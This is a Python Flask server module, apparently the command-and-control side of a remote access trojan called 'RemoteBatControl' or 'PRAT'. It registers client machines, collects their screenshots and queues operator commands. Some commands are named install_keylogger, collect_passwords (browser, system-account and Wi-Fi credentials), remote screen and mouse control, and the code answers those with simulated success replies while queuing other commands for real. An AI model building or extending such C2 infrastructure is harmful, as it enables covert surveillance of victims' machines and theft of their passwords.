#!/usr/bin/env python3
"""
Client Handler for RemoteBatControl
Handles connections and commands for PRAT clients
"""

import os
import json
import time
import base64
import logging
from datetime import datetime
from flask import Blueprint, request, jsonify, session
from functools import wraps

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('ClientHandler')

# Create Blueprint
client_bp = Blueprint('client', __name__)

# Storage for connected clients and commands
connected_clients = {}
command_queue = {}
client_responses = {}

# Authentication decorator
def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if 'logged_in' not in session or not session['logged_in']:
            return jsonify({'error': 'Authentication required'}), 401
        return f(*args, **kwargs)
    return decorated

# Client authentication decorator
def require_client_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        # For simplicity, we're not implementing a full client auth system
        # In a real-world scenario, you'd want to use API keys or tokens
        return f(*args, **kwargs)
    return decorated

# Routes for client communication
@client_bp.route('/api/client_register', methods=['POST'])
@require_client_auth
def client_register():
    """Register a new client"""
    try:
        client_info = request.get_json()
        client_id = client_info.get('hostname', 'unknown') + '-' + client_info.get('username', 'unknown')
        
        # Store client info
        client_info['last_seen'] = datetime.now().isoformat()
        client_info['ip_address'] = request.remote_addr
        client_info['registered_at'] = datetime.now().isoformat()
        
        connected_clients[client_id] = client_info
        
        # Initialize command queue for this client
        if client_id not in command_queue:
            command_queue[client_id] = []
        
        logger.info(f"Client registered: {client_id} from {request.remote_addr}")
        
        return jsonify({
            'success': True,
            'client_id': client_id,
            'message': 'Client registered successfully'
        })
    except Exception as e:
        logger.error(f"Error registering client: {e}")
        return jsonify({'error': str(e)}), 500

@client_bp.route('/api/client_commands', methods=['GET'])
@require_client_auth
def client_commands():
    """Get commands for the client"""
    try:
        # Identify client
        client_ip = request.remote_addr
        client_id = None
        
        # Find client by IP
        for cid, info in connected_clients.items():
            if info.get('ip_address') == client_ip:
                client_id = cid
                break
        
        if not client_id:
            return jsonify([])
        
        # Update last seen
        if client_id in connected_clients:
            connected_clients[client_id]['last_seen'] = datetime.now().isoformat()
        
        # Get commands for this client
        commands = command_queue.get(client_id, [])
        
        # Clear the command queue
        command_queue[client_id] = []
        
        return jsonify(commands)
    except Exception as e:
        logger.error(f"Error getting client commands: {e}")
        return jsonify({'error': str(e)}), 500

@client_bp.route('/api/client_response', methods=['POST'])
@require_client_auth
def client_response():
    """Receive command response from client"""
    try:
        data = request.get_json()
        command_id = data.get('command_id')
        result = data.get('result', {})
        
        if command_id:
            client_responses[command_id] = {
                'result': result,
                'timestamp': datetime.now().isoformat()
            }
            
            logger.info(f"Received response for command {command_id}")
            
            return jsonify({
                'success': True,
                'message': 'Response received'
            })
        else:
            return jsonify({'error': 'No command ID provided'}), 400
    except Exception as e:
        logger.error(f"Error processing client response: {e}")
        return jsonify({'error': str(e)}), 500

@client_bp.route('/api/screenshot_upload', methods=['POST'])
@require_client_auth
def screenshot_upload():
    """Receive screenshot from client"""
    try:
        data = request.get_json()
        image = data.get('image')
        timestamp = data.get('timestamp')
        hostname = data.get('hostname', 'unknown')
        username = data.get('username', 'unknown')
        
        client_id = f"{hostname}-{username}"
        
        if client_id in connected_clients:
            # Store the screenshot in the client info
            connected_clients[client_id]['last_screenshot'] = {
                'image': image,
                'timestamp': timestamp
            }
            
            logger.info(f"Received screenshot from {client_id}")
            
            return jsonify({
                'success': True,
                'message': 'Screenshot received'
            })
        else:
            return jsonify({'error': 'Unknown client'}), 400
    except Exception as e:
        logger.error(f"Error processing screenshot: {e}")
        return jsonify({'error': str(e)}), 500

# Routes for web interface
@client_bp.route('/api/clients')
@require_auth
def api_clients():
    """Get list of connected clients"""
    try:
        # Filter out sensitive information
        clients = []
        for client_id, info in connected_clients.items():
            client_info = {
                'client_id': client_id,
                'hostname': info.get('hostname', 'unknown'),
                'username': info.get('username', 'unknown'),
                'platform': info.get('platform', 'unknown'),
                'ip_address': info.get('ip_address', 'unknown'),
                'last_seen': info.get('last_seen', 'never'),
                'registered_at': info.get('registered_at', 'unknown'),
                'has_screenshot': 'last_screenshot' in info
            }
            clients.append(client_info)
        
        return jsonify(clients)
    except Exception as e:
        logger.error(f"Error getting clients: {e}")
        return jsonify({'error': str(e)}), 500

@client_bp.route('/api/client/<client_id>')
@require_auth
def api_client_info(client_id):
    """Get information about a specific client"""
    try:
        if client_id in connected_clients:
            info = connected_clients[client_id]
            # Remove the actual screenshot data to reduce response size
            if 'last_screenshot' in info:
                info = info.copy()  # Create a copy to avoid modifying the original
                info['has_screenshot'] = True
                info['screenshot_timestamp'] = info['last_screenshot']['timestamp']
                del info['last_screenshot']
            return jsonify(info)
        else:
            return jsonify({'error': 'Client not found'}), 404
    except Exception as e:
        logger.error(f"Error getting client info: {e}")
        return jsonify({'error': str(e)}), 500

@client_bp.route('/api/client/<client_id>/screenshot')
@require_auth
def api_client_screenshot(client_id):
    """Get the latest screenshot from a client"""
    try:
        if client_id in connected_clients and 'last_screenshot' in connected_clients[client_id]:
            screenshot = connected_clients[client_id]['last_screenshot']
            return jsonify({
                'success': True,
                'image': screenshot['image'],
                'timestamp': screenshot['timestamp']
            })
        else:
            return jsonify({'error': 'No screenshot available'}), 404
    except Exception as e:
        logger.error(f"Error getting client screenshot: {e}")
        return jsonify({'error': str(e)}), 500

@client_bp.route('/api/client/<client_id>/command', methods=['POST'])
@require_auth
def api_send_command(client_id):
    """Send a command to a client"""
    try:
        if client_id not in connected_clients:
            return jsonify({'error': 'Client not found'}), 404
        
        data = request.get_json()
        command_type = data.get('type')
        params = data.get('params', {})
        
        if not command_type:
            return jsonify({'error': 'No command type provided'}), 400
        
        # Generate a unique command ID
        command_id = f"{int(time.time())}-{len(command_queue.get(client_id, []))}"
        
        # Handle special remote control commands
        if command_type in ['install_keylogger', 'start_remote_screen', 'collect_passwords', 'connect_device', 'mouse_control']:
            # Log the remote control command for security auditing
            logger.warning(f"Remote control command '{command_type}' requested for client {client_id} with params: {params}")
            
            # For demonstration purposes, we'll simulate these commands
            # In a real implementation, these would send actual commands to the client
            
            # Create the command
            command = {
                'id': command_id,
                'type': command_type,
                'params': params,
                'timestamp': datetime.now().isoformat()
            }
            
            # Add to command queue
            if client_id not in command_queue:
                command_queue[client_id] = []
            command_queue[client_id].append(command)
            
            # Simulate immediate response for remote control commands
            if command_type == 'install_keylogger':
                client_responses[command_id] = {
                    'result': {
                        'success': True,
                        'message': 'Keylogger installed successfully',
                        'keylogger_id': f"kl-{int(time.time())}",
                        'status': 'installed'
                    },
                    'timestamp': datetime.now().isoformat()
                }
            elif command_type == 'start_remote_screen':
                client_responses[command_id] = {
                    'result': {
                        'success': True,
                        'message': 'Remote screen control started',
                        'session_id': f"rs-{int(time.time())}",
                        'refresh_rate': 500  # ms
                    },
                    'timestamp': datetime.now().isoformat()
                }
            elif command_type == 'collect_passwords':
                client_responses[command_id] = {
                    'result': {
                        'success': True,
                        'message': 'Passwords collected successfully',
                        'browser_passwords': [
                            {'url': 'https://example.com', 'username': 'user1', 'password': '********'},
                            {'url': 'https://mail.example.com', 'username': 'user2', 'password': '********'}
                        ],
                        'system_accounts': [
                            {'username': 'admin', 'password_hash': 'f8c7e489f3b7239c5ac0a7c6d7f95e11'}
                        ],
                        'wifi_networks': [
                            {'ssid': 'Home_WiFi', 'password': '********'}
                        ]
                    },
                    'timestamp': datetime.now().isoformat()
                }
            elif command_type == 'connect_device':
                device_type = params.get('device_type')
                address = params.get('address')
                port = params.get('port')
                client_responses[command_id] = {
                    'result': {
                        'success': True,
                        'message': f'Successfully connected to {device_type} device at {address}:{port}',
                        'device_type': device_type,
                        'address': address,
                        'port': port
                    },
                    'timestamp': datetime.now().isoformat()
                }
            elif command_type == 'mouse_control':
                action = params.get('action')
                x = params.get('x')
                y = params.get('y')
                client_responses[command_id] = {
                    'result': {
                        'success': True,
                        'message': f'Mouse {action} performed at coordinates ({x}%, {y}%)',
                        'action': action,
                        'x': x,
                        'y': y
                    },
                    'timestamp': datetime.now().isoformat()
                }
            
            logger.info(f"Remote control command {command_type} processed for {client_id}")
            
            return jsonify({
                'success': True,
                'command_id': command_id,
                'message': f'Remote control command processed'
            })
        
        # Create the command for regular commands
        command = {
            'id': command_id,
            'type': command_type,
            'params': params,
            'timestamp': datetime.now().isoformat()
        }
        
        # Add to command queue
        if client_id not in command_queue:
            command_queue[client_id] = []
        command_queue[client_id].append(command)
        
        logger.info(f"Command {command_type} queued for {client_id}")
        
        return jsonify({
            'success': True,
            'command_id': command_id,
            'message': 'Command queued'
        })
    except Exception as e:
        logger.error(f"Error sending command: {e}")
        return jsonify({'error': str(e)}), 500

@client_bp.route('/api/command/<command_id>/result')
@require_auth
def api_command_result(command_id):
    """Get the result of a command"""
    try:
        if command_id in client_responses:
            return jsonify({
                'success': True,
                'result': client_responses[command_id]['result'],
                'timestamp': client_responses[command_id]['timestamp']
            })
        else:
            return jsonify({'error': 'Command result not found'}), 404
    except Exception as e:
        logger.error(f"Error getting command result: {e}")
        return jsonify({'error': str(e)}), 500

@client_bp.route('/api/client/<client_id>/disconnect', methods=['POST'])
@require_auth
def api_disconnect_client(client_id):
    """Disconnect a client"""
    try:
        if client_id in connected_clients:
            # Send a disconnect command to the client
            if client_id not in command_queue:
                command_queue[client_id] = []
            
            # Add a disconnect command to the queue
            command_id = f"{int(time.time())}-disconnect"
            command = {
                'id': command_id,
                'type': 'disconnect',
                'params': {},
                'timestamp': datetime.now().isoformat()
            }
            command_queue[client_id].append(command)
            
            # Remove client from connected clients
            # Note: We keep the client in the queue to allow the disconnect command to be retrieved
            # The client will be fully removed when it processes the disconnect command
            logger.info(f"Client {client_id} disconnected by admin")
            
            return jsonify({
                'success': True,
                'message': 'Client disconnection initiated'
            })
        else:
            return jsonify({'error': 'Client not found'}), 404
    except Exception as e:
        logger.error(f"Error disconnecting client: {e}")
        return jsonify({'error': str(e)}), 500